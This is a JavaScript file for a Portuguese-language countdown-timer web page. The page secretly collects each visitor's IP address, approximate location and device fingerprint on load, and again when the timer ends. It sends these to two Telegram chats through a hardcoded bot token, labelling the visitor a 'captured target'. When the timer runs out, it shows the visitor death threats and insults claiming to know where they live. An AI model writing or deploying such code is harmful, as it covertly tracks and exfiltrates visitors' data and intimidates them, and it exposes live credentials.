// ================================================
// script.js - Entrada + Timer Zerar (Mensagens Diferentes) + Cooldown Fixo
// ================================================

let targetDate = new Date("2026-04-25T23:59:59").getTime();
let timerInterval = null;

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Você
    "8219025301",   // Luizz
];

// Anti-spam: IP → timestamp da última notificação
const processedIPs = new Map();
const COOLDOWN_TIME = 5 * 60 * 1000; // 5 minutos

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== FUNÇÃO PARA PEGAR IP (mais estável) ====================
async function getCurrentIP() {
    try {
        // Tenta várias fontes em ordem
        let res = await fetch('https://api.my-ip.io/ip.json');
        let data = await res.json();
        if (data.ip) return data.ip;

        res = await fetch('https://api.ipify.org?format=json');
        data = await res.json();
        return data.ip;
    } catch (e) {
        console.error("Erro ao pegar IP:", e);
        return "Não capturado";
    }
}

// ==================== MENSAGEM QUANDO ALGUÉM ENTRA ====================
async function sendEntryMessage(ip, lat, lon) {
    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `👀 ALGUÉM ENTROU NO SITE!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${ip || 'Não capturado'}\n` +
                    `📍 Lat: ${lat || 'N/D'} | Lon: ${lon || 'N/D'}\n` +
                    `📱 Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n\n` +
                    `Alguém abriu a página... será que vai aguentar até o final? 😈`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {
            console.error("Erro mensagem entrada:", err);
        }
    }
}

// ==================== MENSAGEM QUANDO TIMER ZERAR ====================
async function sendTimerZeroMessage(ip, lat, lon) {
    const now = Date.now();

    if (ip && processedIPs.has(ip)) {
        if (now - processedIPs.get(ip) < COOLDOWN_TIME) {
            console.log(`⏳ Cooldown ativo para IP: ${ip}`);
            return;
        }
    }

    if (ip) processedIPs.set(ip, now);

    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${ip || 'Não capturado'}\n` +
                    `📍 Latitude: ${lat || 'Não disponível'}\n` +
                    `📍 Longitude: ${lon || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                    `• Tela: ${device.screen}\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Fuso: ${device.timezone}\n` +
                    `• RAM: ${device.deviceMemory}\n\n` +
                    `HAHAHAHAHA QUE LIXO KKKKK\n` +
                    `Esperou até o final no ${devType.toLowerCase()}...\n\n` +
                    `Não é magia, é habilidade isto...`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {
            console.error("Erro mensagem timer zero:", err);
        }
    }
}

// ==================== CAPTURA IP AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getCurrentIP();
    let lat = '', lon = '';

    try {
        const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`);
        const locData = await locRes.json();
        if (locData.status === "success") {
            lat = locData.lat || '';
            lon = locData.lon || '';
        }
    } catch (e) {}

    userIP = ip;
    userLatitude = lat;
    userLongitude = lon;

    await sendEntryMessage(ip, lat, lon);
}

// ==================== UPDATE TIMER ====================
function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);

        // Pega IP novamente no momento que zera
        getCurrentIP().then(async (ip) => {
            let lat = '', lon = '';
            try {
                const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`);
                const loc = await locRes.json();
                if (loc.status === "success") {
                    lat = loc.lat || '';
                    lon = loc.lon || '';
                }
            } catch (e) {}

            sendTimerZeroMessage(ip, lat, lon);
        });

        showFinalMessageOnScreen();
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

function showFinalMessageOnScreen() {
    const deviceType = detectDeviceType();
    document.getElementById("timer").innerHTML = `
        Tempo esgotado!<br><br>
        Prepare-se para morrer, seu lixo...<br><br>
        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
        Eu sei onde você mora.<br>
        Eu sei o seu IP de merda.<br><br>
        Você é um fracassado patético.<br><br>
        Não é magia, é habilidade isto...
    `;
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();           // Pega IP + envia "Alguém entrou"
    timerInterval = setInterval(updateTimer, 100);
    updateTimer();
}

init();